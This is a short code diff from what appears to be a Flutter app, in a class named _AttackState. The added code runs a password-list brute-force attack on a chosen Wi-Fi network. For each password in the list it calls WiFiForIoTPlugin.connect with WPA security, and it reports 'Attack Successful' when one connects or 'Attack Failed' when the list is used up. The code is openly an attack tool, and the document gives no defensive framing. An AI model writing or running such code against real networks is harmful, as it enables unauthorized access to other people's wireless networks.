@@ -27,6 +27,27 @@ class _AttackState extends State<Attack> {
       setState(() {
         currentPass = PASSWORDS[i];
       });
+      var isConnected = await WiFiForIoTPlugin.connect(widget.wifiNetwork.ssid, security: NetworkSecurity.WPA, password: PASSWORDS[i]);
+      if (isConnected) {
+        setState(() {
+          success = true;
+          done = true;
+          result = "Attack Successful";
+        });
+        break loop;
+      }
+      count++;
+      setState(() {});
+      if (count == PASSWORDS.length) {
+        setState(() {
+          done = true;
+        });
+        if (!isConnected) {
+          setState(() {
+            result = "Attack Failed";
+          });
+        }
+      }
     }
   }
 }
